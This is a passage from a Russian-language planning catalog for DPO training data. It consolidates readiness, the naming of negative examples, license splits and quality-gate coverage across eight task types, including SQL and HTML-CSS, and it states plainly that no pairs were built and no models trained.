| 2 | Переводы (PE-3) | `27.TranslationDomain` (пилот language-translate, кейс HE_EN) | **false** | Токенайзер Phase-0: студент `TOKENIZER_BLOCKED` для иврита; иврит = 0-pair seed; синтетика; `G-DPO-FINAL` | Токенайзер/seed Phase-0 (посаженный корпус пар) + `G-DPO-FINAL` |
| 3 | Серверный код (PE-4) | .NET `src/Xiigen.*` (`xiigen-platform`/`xiigen-flows`), DNA `DataProcessResult<T>` | **false** [условно от M1 + `G-DPO-FINAL`] | Доменного Phase-0-блока НЕТ, но отсутствие builder'а + `G-DPO-FINAL` держат `false` | Ф3-builder (M1) + `G-DPO-FINAL` |
| 4 | Клиентский код (PE-5) | Angular `xiigen-flows` `flows/FLOW-NN-*/client/angular/` | **false** [условно от M1 + `G-DPO-FINAL`] | Честный split: «форма компонента» жива, «API-wiring» (`HttpClient`/RxJS/сервис) = `SYNTHETIC_SEED`; статик-демо корпус | Ф3-builder (M1) + реальный API-wiring корпус + `G-DPO-FINAL` |
| 5 | Серверная документация (PE-6) | `42.ProjectWikiDomain` `project_documentation_pipeline` над .NET | **false** [условно от M1 + `G-DPO-FINAL`] | Единственный домен с живым DPO-генератором И измеренным ПРОВАЛЬНЫМ baseline `0.286`/`0.68`; flip против образца-Fable (`true→false`) | Ф3-builder (M1) + grounding baseline lift + `G-DPO-FINAL` |
| 6 | Клиентская документация (PE-7) | `42.ProjectWikiDomain` doc-pipeline над Angular | **false** [условно от M1 + `G-DPO-FINAL`] | Baseline `0.286`/`0.68` на .NET-корпусе, на Angular НЕ переносится (TS PENDING); flip против образца-Fable | Ф3-builder (M1) + TS-baseline (**задача измерения ОПРЕДЕЛЕНА** §4 п.4 / FIX-RES-1 B4: тот же held-out прогон над Angular/TS-корпусом, source-disjoint + Jaccard-guard, раннер `IGraphMeasurementRunner` `:842–:846`; PENDING = execution, не design) + подключение клиентов + `G-DPO-FINAL` |
| 7 | Хранимые процедуры / SQL (PE-8) | `42.ProjectWikiDomain` SP-ветка + REFERENCE `Sql/` | **false** [условно от M1 + `SYNTHETIC_SEED` + `G-DPO-FINAL`] | 0 реального корпуса (VERIFIED: 0 `CREATE PROC`/0 `*.sql` в 5 репо) → `SYNTHETIC_SEED`-forward; flip против образца-Fable | Real-corpus unlock (static `.sql` ИЛИ consent-gated `ISqlConsentGate` DENY) + M1 + `G-DPO-FINAL` |
| 8 | HTML-CSS (PE-9) | `44.DesignConversionDomain` / FigmaToCode design→код | **false** — держит §4 п.3 (эхо-судья), **не только `G-DPO-FINAL`** | Эхо-судья приёмки VERIFIED (`critic.Confidence == verdict.Score` `DesignConversionTrainedUnits.cs:47/:250`), `PassesGate:false`, Route B пуст, 0/10 e2e; **ЕДИНСТВЕННЫЙ код-домен с настоящим доменным Phase-0-блоком в арбитре приёмки** | Замена эхо-судьи независимым `Q_struct`-скорером-арбитром (**формализовано** §4 п.3 / FIX-RES-1 B2: `IDesignConversionCriticUnit : ILogicalUnit` в L5 `DesignConversionMachine`, `SI_GATE_7` `acceptance_signal != trained_unit_self_confidence != echo_judge_constant`, борд-строка под `REAL_TRAINER_ROUTE_B_GATE`) + Route B мост → `11.DPO/DpoTrainer` + M1 + `G-DPO-FINAL` |

**Вердикт G1:** все 8 задач = **`DpoTrainReady=false`**. **No dual-live-canon статуса готовности (FC-44):** нет
задачи, где один носитель говорит `true`, а другой `false` для той же задачи. §5.2, front-matter и пер-проходные
логи несут `false` единообразно. Задачи 5/6/7/8 несут явный **flip против образца-Fable** (`true→false`) именно
чтобы НЕ создать второй живой канон готовности (наш канон: `false` для ВСЕХ до `G-DPO-FINAL`). **Задача 8
дополнительно** держится эхо-судьёй §4 п.3, не только `G-DPO-FINAL` — это самый строгий `false` в каталоге.

---

### G2 — Name-reconciliation свип таксономии негативов (все 8 задач)

| Задача | Негативы (имя кода) | Класс имени | Родительская ось / примечание |
|---|---|---|---|
| 1 Оркестрация | `ORCH-03`, `ORCH-08`, `ORCH-01`, `ORCH-09`, `ORCH-02` | **канонические** (`ORCH-01..10`) | владелец `RAG-10` §6.2/§6.3 |
| 2 Переводы | `mistranslation`, `omission`, `literal_calque` | **канонические** доменные `RAG-03` | владелец `RAG-03` |
| 2 Переводы | `language_leak`, `number_format_loss` | доменно-локальные (NEW) | честно новые (нет канон-кода) |
| 3 Серверный код | `dna_throw_for_business_logic`, `dna_null_or_bare_bool_return`, `dna_concrete_dependency_bypass`, `dna_missing_tenant_isolation`, `dna_non_idempotent_create` | доменно-локальные `dna_*` | КАЖДЫЙ родитель = `PromptError-02 No DNA Safety`; `RAG-07`-рубрики = ОСЬ СКОРЕРА |
| 4 Клиентский код | `ng_unmanaged_subscription_leak`, `ng_http_in_component_service_bypass`, `ng_untyped_any_boundary` | доменно-локальные `ng_*` | родитель `PromptError-02`; `secretPresenceArbiter`/`idempotentCreateArbiter` = ОСЬ СКОРЕРА (`RAG-07`), не код |
| 5 Серверная документация | `doc_hallucinated_claim` | доменно-локальный (NEW, критический) | false-presence; отсутствует в живой таксономии doc-генератора |
| 5 Серверная документация | `ORCH-02`, `PromptError-11`, `PromptError-09`, `PromptError-12` | **канонические** | — |
| 6 Клиентская документация | `doc_hallucinated_claim` | **переиспользован из PE-6 БЕЗ переименования** | no dual-canon (то же имя, не второй канон) |
| 6 Клиентская документация | `doc_omitted_behavior_false_absence`, `doc_wrong_framework_terminology` | доменно-локальные (NEW) | зеркало-контраст + ось «терминология фреймворка» |
| 6 Клиентская документация | `ORCH-02`, `PromptError-11` | **канонические** | — |
| 7 SQL | `sql_hallucinated_parameter` | доменно-локальный (NEW) | false-presence; зеркало живого `missing_sql_parameters` |
| 7 SQL | `missing_sql_side_effects` | **живой канон-код `:89–:90` переиспользован БЕЗ переименования** | descriptive `sql_omitted_side_effect` МАПИТСЯ на живой канон (не второй канон) |
| 7 SQL | `sql_injection_unsafe_concat` | доменно-локальный security | `sqlInjectionArbiter` = ОСЬ СКОРЕРА (`RAG-07`), не код |
| 7 SQL | `ORCH-02`, `PromptError-11` | **канонические** | — |
| 8 HTML-CSS | `dcm_xss_unsanitized_markup` | доменно-локальный security | канонического `RAG-07` XSS-арбитра НЕТ (CITED §4 п.3); родитель = security |
| 8 HTML-CSS | `dcm_uncovered_ir_node`, `dcm_hallucinated_element` | доменно-локальные `dcm_*` | N2 родитель = живой `missing_element` (coverage); N3 зеркала в живой таксономии НЕТ (честно) |
| 8 HTML-CSS | `ORCH-02`, `PromptError-11` | **канонические** | — |

**Сводка классов имён:**
- **Канонические (не переименовывать):** `ORCH-01`, `ORCH-02`, `ORCH-03`, `ORCH-08`, `ORCH-09`; `PromptError-09`,
  `PromptError-11`, `PromptError-12`; `RAG-03`-коды (`mistranslation`/`omission`/`literal_calque`).
- **`RAG-07`-рубрики как ОСЬ СКОРЕРА (не коды негативов):** `secretPresenceArbiter`, `idempotentCreateArbiter`,
  `sqlInjectionArbiter` — single-owner FC-44 (рубрика = ось проверки, не имя дефекта).
- **Доменно-локальные (явные NEW):** `dna_*`×5, `ng_*`×3, `doc_*`×3 (`doc_hallucinated_claim`,
  `doc_omitted_behavior_false_absence`, `doc_wrong_framework_terminology`), `sql_*`×2
  (`sql_hallucinated_parameter`, `sql_injection_unsafe_concat`), `dcm_*`×3.
- **Переиспользованы БЕЗ переименования (то же имя = один канон):** `missing_sql_side_effects` (задача 7 → живой
  канон-код генератора `:89–:90`), `doc_hallucinated_claim` (PE-6 → PE-7, тот же доменно-локальный код).

**Вердикт G2 — FC-44 no-dual-canon = PASS.** НЕТ двух живых имён для одной оси: канонические номера не
переименованы; переиспользованные коды несут ТО ЖЕ имя (не создан второй канон); каждый доменно-локальный код
имеет названную родительскую ось (`PromptError-02`, `missing_element`, security, evidence-grounding). **Расхождение с
образцом-Fable:** образец использовал живые коды таксономии 44 (`semantic_layout_hierarchy`/`responsive`/`missing_element`);
мы для задачи 8 задали `dcm_*`. **Оба FC-44-чисты**, потому что в обоих случаях родительские оси названы явно (у нас
`dcm_uncovered_ir_node` явно называет родителя = живой `missing_element`; `dcm_hallucinated_element` честно отмечает,
что зеркала в живой таксономии НЕТ). Это стилевое расхождение имён, не двойной канон.

---

### G3 — Carrier-mismatch реестр (наблюдения для code-repair backlog, PLAN-ONLY)

| # | Находка | Локация | Что не так | Класс | Статус |
|---|---|---|---|---|---|
| 1 | Поле `CSharpLanguageVersion` несёт TS-версию | `ProjectDocumentationUnit` (15 полей `:1561–:1576`), поле `:1570`; VERIFIED PE-7 | Имя поля привязано к C#, а данные едут TypeScript-версии (документируется Angular) — carrier-mismatch/имя вводит в заблуждение | schema-generalization | **наблюдение** для code-repair backlog; НЕ починка (carrier работает, чинить нечего для примера, но PE-10 обязан пометить) |

**Вердикт G3.** Собран **1 конкретный carrier-mismatch** (`CSharpLanguageVersion` `:1570`). Это единственная живая
carrier-находка проходов PE-2..PE-9 (PE-7). Это **наблюдение для code-repair backlog**, не починка: каталог PLAN-ONLY,
продуктовый код не трогаем. Рекомендация владельцу кода (не для этого прохода): обобщить поле до
`SourceLanguageVersion`/typed-per-язык носителя. Примечание единого владельца: диагностические поля пары
(`LegScope`/`OverlapScore`/`SplitProofRef`/`RowRejectionReason`) живут в `TriadVerdict`/боковом манифесте, НЕ на
канон-строке `GraphDpoPair` (§1.4) — это single-owner дисциплина, НЕ carrier-mismatch, в реестр не входит.

---

### G4 — LegScope-резидуалы (8 задач)

| # | Задача | LegScope | Статус |
|---|---|---|---|
| 1 | Оркестрация (PE-2) | не заявлен явно проходом → **common-кандидат** (по умолчанию, первопартийный домен 42/43) | **наблюдение** (нет платного сплита; резидуалом не помечен) |
| 2 | Переводы (PE-3) | не заявлен явно проходом → **common-кандидат** (первопартийный `27.TranslationDomain`) | **наблюдение** (нет платного сплита) |
| 3 | Серверный код (PE-4) | **common-кандидат** Free=.NET (подтверждено нотой PE-6 «обратно к серверу PE-4») | **решён** |
| 4 | Клиентский код (PE-5) | **PersonalAdaptive** (Paid=Angular по сплиту `RAG-02`, не free-common) | **решён** проходом (назначен PersonalAdaptive; опирается на стоячее правило `RAG-02`) |
| 5 | Серверная документация (PE-6) | **common-кандидат** Free=.NET, privacy `.xiigen` | **решён** |
| 6 | Клиентская документация (PE-7) | **PersonalAdaptive** [Paid=Angular, сплит «механика-конвейера=Free .NET / документируемые СТРОКИ=Paid Angular»] | **`RESOLVED_FROM_DOCUMENTED_AUTHORITY`** (FIX-RES-1 / A1, 2026-07-14): механика doc-конвейера `42.ProjectWikiDomain` = `common` (llm_mvp_core, Free .NET, R5); DPO-строки «документировать Angular» = `PersonalAdaptive` v1 (Paid=Angular `RAG-02` `:18`, запрет кормить free-common ногу, каталог `:3316–:3318`); обратимо до `G-DPO-FINAL`. **NARROWED-остаток (НЕ закрыт, opt-in):** `paid-domain common leg` — центрально-обученная license-gated раздача платной способности = **non-blocking** будущая монетизационная архитектура на решение Luba; v1-дефолт `PersonalAdaptive` безопасен без неё. _Прежний `LUBA_PRODUCT_DECISION_RESIDUAL` («финальный сплит на решение Luby») — historical/pre-resolution; текущий вердикт = `RESOLVED_FROM_DOCUMENTED_AUTHORITY`._ |
| 7 | Хранимые процедуры / SQL (PE-8) | **PersonalAdaptive** (Paid=SQL `RAG-02` `:18` + consent-обострение `ISqlConsentGate` DENY) | **`RESOLVED_FROM_DOCUMENTED_AUTHORITY`** (FIX-RES-1 / A2, 2026-07-14): `PersonalAdaptive` на двойном основании — Paid=SQL (`RAG-02` `:18`) + `ISqlConsentGate` DENY по умолчанию (приватные БД). Синтетический seed-корпус (`BuildStoredProcedureUnits :293–:327`) = repo-hosted cold-start scaffold (R5), НЕ user-side. **NARROWED-остаток (НЕ закрыт, opt-in):** `paid-domain common leg` (центрально-обученная license-gated раздача) = **non-blocking** будущая монетизация на решение Luba; v1-дефолт `PersonalAdaptive` безопасен без неё. _Прежний `LUBA_PRODUCT_DECISION_RESIDUAL` («домен-нога остаётся платной, финальный сплит на решение Luby») — historical/pre-resolution; текущий вердикт = `RESOLVED_FROM_DOCUMENTED_AUTHORITY`._ |
| 8 | HTML-CSS (PE-9) | **common-кандидат** (HTML+CSS вне платного `RAG-02`, FigmaToCode ISC + первопартийный 44) с **user-макет→PersonalAdaptive каветой** | **`RESOLVED_FROM_DOCUMENTED_AUTHORITY`** (FIX-RES-1 / A3, 2026-07-14): базовый HTML+CSS = `common` (вне платного `RAG-02`; FigmaToCode ISC training-safe + первопартийный домен 44); реальные пользовательские МАКЕТЫ → `PersonalAdaptive`/`.xiigen` **by construction** (`BLOCK_FOR_COMMON`, каталог `:4116–:4117`). Расщепление детерминировано конструкцией (не открытый сплит) — narrowed `paid-domain common leg` A1/A2 сюда НЕ применяется. _Прежний `LUBA_PRODUCT_DECISION_RESIDUAL` («common↔PersonalAdaptive на решение Luby») — historical/pre-resolution; текущий вердикт = `RESOLVED_FROM_DOCUMENTED_AUTHORITY`._ |

**Вердикт G4 (обновлён FIX-RES-1, 2026-07-14).** Три задачи, ранее помеченные `LUBA_PRODUCT_DECISION_RESIDUAL`,
теперь **`RESOLVED_FROM_DOCUMENTED_AUTHORITY`** из документированного канона (прежний статус помечен
historical/pre-resolution в каждой строке, no stale-status-carrier): задача 6 (документация Angular = `PersonalAdaptive`
по сплиту механика-Free/строки-Paid), задача 7 (SQL = `PersonalAdaptive` на двойном основании Paid+consent-DENY), задача
8 (HTML-CSS = `common` базовый + user-макет→`PersonalAdaptive` by construction). Остаётся ТОЛЬКО **non-blocking opt-in
монетизационная нота** `paid-domain common leg` (центрально-обученная license-gated раздача платной способности) для
задач 6/7 — это будущая архитектура на решение Luba, НЕ блокер: v1-дефолт `PersonalAdaptive` безопасен без неё. Задача 4
назначена `PersonalAdaptive` проходом (решена, `RAG-02`). Задачи 1/2 — **common-кандидат по умолчанию** (первопартийные
домены, не платные), наблюдение, не открытый резидуал. Каталог PLAN-ONLY продуктовых решений за Luba НЕ принимает —
эти три строки лишь ИЗВЛЕКАЮТ уже документированную авторитетность (Fable предложил, Opus-родитель валидировал, Luba
одобрила применение).

---

### G5 — SI_GATE-покрытие (8 задач × SI_GATE_1..7 из trainable-architecture-decision-SKILL)

| SI_GATE | Смысл | Покрытие по 8 задачам | Дыра? |
|---|---|---|---|
| `SI_GATE_1` | shared-contract single-owner sweep | ВСЕ 8 проецируют 14-полевой `GraphDpoPair` + 20-полевой `TeacherProvenance` как subset-render с owner-pointer §1.4 (владелец plan-07/08) | нет |
| `SI_GATE_2` | cross-file owner resolution | каталог называет владельцев plan-07/08/09/overlay; в G6 разрешён owner Ф3-builder | нет |
| `SI_GATE_3` | reward-scalarization для не-скалярных сторон | generic `reward(side)=Beta·(policyLogP−referenceLogP)` над `SerializeCandidate` (§1.3 п.5) для ВСЕХ структурных задач (1,3,4,5,6,7,8) + перевод (2); **явный доменный `Q_struct`-экстрактор — только задача 8** (обязателен, т.к. `VisualVerdict.Score` эхо-исключена) | нет (reward(side) определён для всех сторон) |
| `SI_GATE_4` | cardinality fan-out (winner-vs-each-loser) | **ВСЕ 8** — каждый проход несёт «fan-out 5 пар winner-vs-each-loser», поле `Rejected` НИКОГДА не список (§1.3 п.10) | нет |
| `SI_GATE_5` | order-features carrier | primary — задача 1 (order графа: `chosen`/`rejected` сериализуют `OrderedPatternIds`, §1.4); **N/A-с-причиной** для не-последовательностных (перевод/одиночный док) — там порядок не обучаемая ось | нет (N/A обоснован) |
| `SI_GATE_6` | Y_best determinism classification | ВСЕ 8 — `Y_best` через `IndependentDomainScorer` (детерминированный eval-only) + `ChosenSelectionRule` overlay (`chosen=Y_goal ⇔ Score(Y_goal)>Score(Y_best)`); классифицирован как eval-only baseline, не trainable authority | нет |
| `SI_GATE_7` | acceptance-signal independence | **ВСЕ 8** — `acceptance_signal_source != trained_unit_self_confidence` (§1.3 п.8); **задача 8 дополнительно** `!= echo_judge_constant` (VERIFIED) | нет |

**Вердикт G5 — дыр нет.** `SI_GATE_4` (fan-out) и `SI_GATE_7` (acceptance-independence) покрыты ВСЕМИ 8 задачами.
`SI_GATE_3` (reward-scalarization) покрыт generic-формулой §1.3 п.5 для всех структурных сторон + явным
доменным `Q_struct` для задачи 8 (html+css — не-скаляр, обязателен). `SI_GATE_1/2/6` держатся single-owner
проекцией, owner-указателями и классификацией `Y_best`. `SI_GATE_5` binds задачу 1 (order графа), N/A-с-причиной для
несеквенсных задач. **`SI_GATE_8/9/10`** (threshold-scorer-input / provider-name-role / family-license) — владельцы
plan-07/08; каталог их НЕ перелочивает: пороги overlap `0.45–0.75`/`0.60`/`0.75` процитированы из владельцев
(`RAG-10`/`RAG-03`/plan-07), новый порог не залочен — это **корректное** single-owner поведение, не дыра.

---

### G6 — Привязка к WO-M1.1 + roll-up честных долгов §4

**(а) Как 8-задачный каталог входит в WO-M1.1 (seed-корпус для pair-builder).**

**ЧЕСТНАЯ НОТА source-addressability (claim-verification).** Литерал `WO-M1.1` — **внутренний forward-pointer
самого каталога**: `grep "WO-M1.1"` по всей папке `dpo legal build` даёт **0 hits вне этого файла**. Он НЕ разрешается
в физический якорь `WO-M1.1` в семье плана/доски → классификация **CITED-not-verified** для литерала. Реальный хребет
DPO-build, к которому каталог обязан привязаться (VERIFIED живым чтением plan-07 + доски ЭТИМ проходом):

- **Ф3 — DPO-строитель** (доска `active-codex-execution-EXECUTION-CONTROL-BOARD.md` Ф3, ряд Ф3.1.1);
- детерминированный `GraphDpoBuilder.BuildCandidateAsync(GraphDpoSourceRow, BuildContext, ct)` — **NEW**-класс
  (plan-07 `:60`, `:456`, class-diagram `:612–:620`); нормализатор/валидатор, возвращает только `Candidate`;
- обучаемый выбор материала пар = `TrainableGraphDpoBuilderUnit` (реализует `IGraphDpoPairBuilderUnit`, вход
  `GraphDpoBuildInput` → выход `GraphDpoPairCandidate`, plan-07 §3.5 `:564–:633`), обучается через L5 DPO-тренер
  (блок 10); `GraphDpoBuilder` = детерминированный baseline для ablation.

**Цепочка привязки каталога → M1/Ф3 (VERIFIED plan-07 `:29`):**

```text
пример каталога (chosen/rejected промпт-пара под задачу N)
   -> материал GraphDpoSourceRow (входной seed-корпус)
   -> GraphDpoBuilder.BuildCandidateAsync            (Ф3, детерминированный normalizer/validator)
   -> GraphDpoPairCandidate
   -> TriadLegalProjection (полный predicate proof, G_DPO_FINAL)
   -> GraphDpoPair(Level=unit)                       (14-полевой канон §1.4, владелец plan-07 §3.2)
   -> LearningTrainingItem/JSONL -> DpoDataset.Load -> TrainBatchAsync
   -> checkpoint manifest -> promotion gate
```

Итог привязки: **8-задачный каталог = входной seed-корпус `GraphDpoSourceRow`-материала**, который M1/Ф3 pair-builder
потребляет. Каталог поставляет пары «хороший промпт / плохой промпт» под каждую из 8 задач; builder Ф3 превращает их в
`GraphDpoPairCandidate` → (после legal/predicate proof) `GraphDpoPair`. Кандидат-пункт для владельца плана (не для
этого прохода): либо добавить реальный якорь `WO-M1.1` в доску/план, либо явно зафиксировать, что `WO-M1.1` =
никнейм Ф3-builder milestone.

**(б) Roll-up честных долгов §4 — отработано / остаётся открытым.**

| §4 п. | Долг | Статус | Доказательство |
|---|---|---|---|
| п.1 | SQL — 0 реального корпуса | **ОТРАБОТАНО** (PE-8) | VERIFIED counted spot-scan: 0 `CREATE PROC`/0 tracked `*.sql`/0 `*.sql` на ФС/0 DbContext в 5 репо; `SYNTHETIC_SEED`-forward записан |
| п.3 | HTML-CSS — эхо-судья Phase-0 | **ОТРАБОТАНО** (PE-9) | VERIFIED spot-read: `critic.Confidence == verdict.Score` `DesignConversionTrainedUnits.cs:47/:250`, `PassesGate:false`, Route B пуст |
| п.2 | Переводы — токенайзер/иврит 0-pair | **ОСТАЁТСЯ** | иврит студент `TOKENIZER_BLOCKED`, 0-pair seed; baseline на TS **PENDING**; unlock = токенайзер/seed Phase-0 |
| п.4 | Документация — измеренный провальный baseline | **ОСТАЁТСЯ (задача измерения ОПРЕДЕЛЕНА)** | `0.286`/`0.68` на .NET, на Angular НЕ переносится (TS PENDING). **TS-baseline = задача ИЗМЕРЕНИЯ определена** (FIX-RES-1 / B4, §4 п.4): тот же held-out прогон над Angular/TS-корпусом (`generic_documentation_qa_accuracy` @0.90 / `hallucination_rate` @0.00, каталог `:2354`), кандидаты PE-7 (`:57–:74`/`:121–:125`), source-disjoint + Jaccard-guard, `IGraphMeasurementRunner` `:842–:846`. PENDING = execution, не design |
| п.5 | Клиентский код — корпус static-demo | **ОСТАЁТСЯ** | API-wiring (`HttpClient`/RxJS) = `SYNTHETIC_SEED`; жив только «форма компонента» |
| п.6 | Общий legal-долг `G-DPO-FINAL` | **ОСТАЁТСЯ (частично)** | до `G-DPO-FINAL` (overlay `:48–:53`) любой teacher-выход = eval/quarantine — ОСТАЁТСЯ. **hosted acceptance number = `RESOLVED_BY_LUBA_LIVE` 2026-07-14** (FIX-RES-1 / B1: `HeldOutAccuracy(Y_goal_TP2) >= 0.90`, порог `generic_documentation_qa_accuracy`; §4 п.6 + 07-файл `Q-TP-235B-EVAL`) + нота-риск абсолютного пола (per-domain/budget-bounded митигация = open EXECUTION-наблюдение). Легальность/методика hosted (`G-TP-4`) — уже RESOLVED, не трогается |
| — | Эхо-судья **ЗАМЕНА** (задача 8) | **ОСТАЁТСЯ = code-repair (формализовано)** | документация долга отработана (п.3); замена **формализована** (FIX-RES-1 / B2, §4 п.3): независимый `Q_struct`-скорер-арбитр `IDesignConversionCriticUnit : ILogicalUnit` в L5 `DesignConversionMachine`, `SI_GATE_7` (`acceptance_signal != trained_unit_self_confidence != echo_judge_constant`), обучение Route B → `11.DPO/DpoTrainer` полным лайфциклом, борд-строка под `REAL_TRAINER_ROUTE_B_GATE` — продуктовая починка ВНЕ каталога, НЕ этот PLAN-ONLY проход |
| — | SP-генерация **capability** (задача 7) | **ОСТАЁТСЯ = code-repair (формализовано)** | цепочка разблокировки **формализована** (FIX-RES-1 / B3, §4 п.1): (1) real-corpus unlock = static `.sql` ЛИБО consent-gated `ISqlConsentGate` (DENY); (2) M1/Ф3 pair-builder + T-SQL scorer/парсер (не существуют); (3) архитектурный дом = SP-ветка `42.ProjectWikiDomain` + REFERENCE `Sql/` (`ISqlConnectionExtractor`/`ISqlConsentGate`/`ISqlObjectExtractor`/`SqlWikiDocumentationOrchestrator` — кода нет); (4) `G-DPO-FINAL`. Исполнение процедур = отдельная consent-gated runtime-способность |

**(в) Финальный дисклеймер `catalog != capability`.** Каталог = **обучающий seed**, НЕ работающая способность. По
итогу всех 10 проходов PE-1..PE-10: **0 учителей вызвано, 0 `GraphDpoPair` построено, 0 обучаемых юнитов обучено**,
0 БД тронуто, 0 рендеров/браузеров запущено, 0 продуктового кода/тестов/git-write. Все `Y_best`/`Y_goal`/негативы —
АВТОРСКИЕ композиции (`SYNTHETIC_SEED`) по форме живых контрактов (якоря процитированы), НЕ реальные выходы моделей.
Наличие примера промпта в плане НЕ является заявлением, что способность обучена.

---

### PE10-ЛОГ — Что сделано + FC-44 sweep + счётчики + честность

1. **Добавлена секция «КОНСОЛИДАЦИЯ PE-10/10»** (эта секция) с 6 гейтами G1–G6 (cross-catalog sweep всех 8 задач).
2. **FC-44 single-owner sweep в ОДНОМ шаге:** (а) строка §5.2 «Консолидация | PE-10»: `NOT_STARTED → ЗАПОЛНЕНО
   [FIX-PE-10]`; (б) front-matter `pass` обновлён + добавлен `pass_pe10_consolidation`; (в) эта секция. Двух живых
   противоречивых статусов нет (`stale-status-carrier` = 0).
3. **Счётчики НЕ тронуты:** `WO 53` / `решения 26` / `ветки 55` / `связи 21` / `M5=46` — БЕЗ изменений (каталог =
   plan-content, консолидация НЕ создала реального нового WO). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
4. **Пакет честности:** `claim_scope` = изменён ТОЛЬКО этот файл (секция консолидации + FC-44 sweep). `catalog !=
   capability`; учитель НЕ вызывался; 0 пар построено; 0 юнитов обучено; продуктовый код/тесты/git-write НЕ
   выполнялись. `evidence_scope` ЭТИМ проходом: живой grep `WO-M1.1`/`M1.1`/`GraphDpoBuilder` по папке `dpo legal
   build` (VERIFIED: `WO-M1.1` = 0 hits вне каталога; `M1.1.1/M1.1.2` в plan-04 = под-задачи «M1. Контракт машины»,
   не pair-builder), живое чтение plan-07 `:29`/`:60`/`:456`/`:564–:633` + доска Ф3.1.1 (VERIFIED хребет Ф3-builder),
   каталог §1.3/§1.4/§2.2/§2.3/§3/§4/§5.2 + все front-matter pass-логи (полный read); скиллы — plan-review (FC-44),
   trainable-architecture (SI_GATE_1..10), claim-verification, output-readability (read). `downgrade_needed`: привязка
   `WO-M1.1` = **CITED-not-verified** для литерала (никнейм каталога, 0 hits вне файла), VERIFIED только для реального
   Ф3-builder хребта. `subagent_id_or_NONE`: `UNKNOWN_IN_SUBAGENT` (bounded sub-agent прохода PE-10, платформенный id
   скрыт; parent reconciles). Валидация этого прохода = Opus 4.8 (родитель).

---
*Конец прохода PE-10/10 — КОНСОЛИДАЦИЯ ВЫПОЛНЕНА (G1–G6). Все 10 проходов PE-1..PE-10 завершены: 8/8 типов задач
заполнены + сквозная консолидация. Каталог остаётся PLAN-ONLY (`catalog != capability`); `PLAN_NOT_READY` плана и
счётчики НЕ тронуты; коммитит Luba (ветка `main`).*
